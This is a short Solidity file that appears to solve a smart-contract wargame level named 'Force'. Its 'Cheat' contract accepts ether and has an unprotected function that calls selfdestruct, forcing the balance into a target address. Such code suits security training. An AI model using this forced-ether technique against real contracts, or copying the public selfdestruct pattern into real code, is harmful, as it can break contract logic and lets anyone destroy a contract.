pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Cheat{
    
    function() payable{
        this;
    }
    
    function _suicide(address _to){
        selfdestruct(_to);
    }
}